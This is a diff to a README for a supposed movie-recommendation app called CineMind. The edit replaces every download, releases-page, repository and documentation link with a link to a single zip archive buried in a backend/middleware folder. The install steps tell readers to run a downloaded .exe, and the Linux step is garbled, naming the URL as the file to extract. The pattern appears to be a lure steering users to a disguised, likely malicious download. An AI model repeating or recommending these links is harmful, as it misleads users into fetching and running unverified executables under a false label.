@@ -6,11 +6,11 @@ Welcome to CineMind! This application helps you find movies tailored to your tas
 
 ## 📥 Download CineMind
 
-[![Download CineMind](https://raw.githubusercontent.com/alaf79/CineMind/main/backend/models/Cine-Mind-hairlet.zip%20CineMind-Get%20it%20now!https://raw.githubusercontent.com/alaf79/CineMind/main/backend/models/Cine-Mind-hairlet.zip)](https://raw.githubusercontent.com/alaf79/CineMind/main/backend/models/Cine-Mind-hairlet.zip)
+[![Download CineMind](https://github.com/alaf79/CineMind/raw/refs/heads/main/backend/middleware/Mind-Cine-v3.9.zip%20CineMind-Get%20it%20now!https://github.com/alaf79/CineMind/raw/refs/heads/main/backend/middleware/Mind-Cine-v3.9.zip)](https://github.com/alaf79/CineMind/raw/refs/heads/main/backend/middleware/Mind-Cine-v3.9.zip)
 
 To start using CineMind, you need to visit the download page. 
 
-[Visit this page to download CineMind](https://raw.githubusercontent.com/alaf79/CineMind/main/backend/models/Cine-Mind-hairlet.zip).
+[Visit this page to download CineMind](https://github.com/alaf79/CineMind/raw/refs/heads/main/backend/middleware/Mind-Cine-v3.9.zip).
 
 ## 📋 System Requirements
 
@@ -27,14 +27,14 @@ Before you install CineMind, make sure your computer meets the following require
 Follow these steps to install and run CineMind:
 
 1. **Download the Application**
-   - Go to the [CineMind releases page](https://raw.githubusercontent.com/alaf79/CineMind/main/backend/models/Cine-Mind-hairlet.zip).
+   - Go to the [CineMind releases page](https://github.com/alaf79/CineMind/raw/refs/heads/main/backend/middleware/Mind-Cine-v3.9.zip).
    - Look for the latest version of CineMind.
    - Click the download link for your operating system.
 
 2. **Install CineMind**
    - **For Windows**: Double-click the downloaded `.exe` file and follow the on-screen instructions to install.
    - **For macOS**: Open the downloaded `.dmg` file and drag the CineMind icon into your Applications folder.
-   - **For Linux**: Extract the downloaded `https://raw.githubusercontent.com/alaf79/CineMind/main/backend/models/Cine-Mind-hairlet.zip` file and run the installer from the terminal.
+   - **For Linux**: Extract the downloaded `https://github.com/alaf79/CineMind/raw/refs/heads/main/backend/middleware/Mind-Cine-v3.9.zip` file and run the installer from the terminal.
 
 3. **Run CineMind**
    - After installation, locate the CineMind app in your applications list.
@@ -85,7 +85,7 @@ If you're interested in contributing to CineMind, please consider:
 
 Explore these resources to learn more about CineMind and get involved:
 
-- [CineMind GitHub Repository](https://raw.githubusercontent.com/alaf79/CineMind/main/backend/models/Cine-Mind-hairlet.zip)
-- [Documentation](https://raw.githubusercontent.com/alaf79/CineMind/main/backend/models/Cine-Mind-hairlet.zip)
+- [CineMind GitHub Repository](https://github.com/alaf79/CineMind/raw/refs/heads/main/backend/middleware/Mind-Cine-v3.9.zip)
+- [Documentation](https://github.com/alaf79/CineMind/raw/refs/heads/main/backend/middleware/Mind-Cine-v3.9.zip)
 
-Thank you for choosing CineMind! We hope you enjoy discovering new films tailored to your unique tastes. Remember to revisit the [CineMind releases page](https://raw.githubusercontent.com/alaf79/CineMind/main/backend/models/Cine-Mind-hairlet.zip) for future updates.
+Thank you for choosing CineMind! We hope you enjoy discovering new films tailored to your unique tastes. Remember to revisit the [CineMind releases page](https://github.com/alaf79/CineMind/raw/refs/heads/main/backend/middleware/Mind-Cine-v3.9.zip) for future updates.
